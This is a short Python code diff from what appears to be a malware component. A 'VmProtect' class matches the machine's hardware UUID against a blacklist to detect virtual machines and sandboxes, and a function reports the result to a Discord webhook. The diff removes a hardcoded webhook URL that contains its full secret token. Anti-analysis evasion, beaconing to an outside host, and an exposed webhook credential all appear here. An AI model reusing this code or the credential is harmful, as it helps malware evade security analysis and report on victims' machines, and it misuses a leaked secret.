@@ -1,7 +1,6 @@
 import os
 import subprocess
 import requests
-WEBHOOK_URL = "https://discord.com/api/webhooks/1288622525772861450/BlAO7PvOQEbmqvSpqFG_LJMSLW1JOmrNVNHO9QlQeyAgC1pQH0HpHGMAQMZeC-HEP8bG"
 class VmProtect:
     BLACKLISTED_UUIDS = (
         '7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', 
@@ -72,7 +71,7 @@ def send_to_discord(is_vm):
     data = {
         "content": f"VM Detection: {'Yes' if is_vm else 'No'}"
     }
-    response = requests.post(WEBHOOK_URL, json=data)
+    response = requests.post(webhook_url, json=data)
     if response.status_code == 204:
         print("Successfully sent the result to Discord!")
     else:
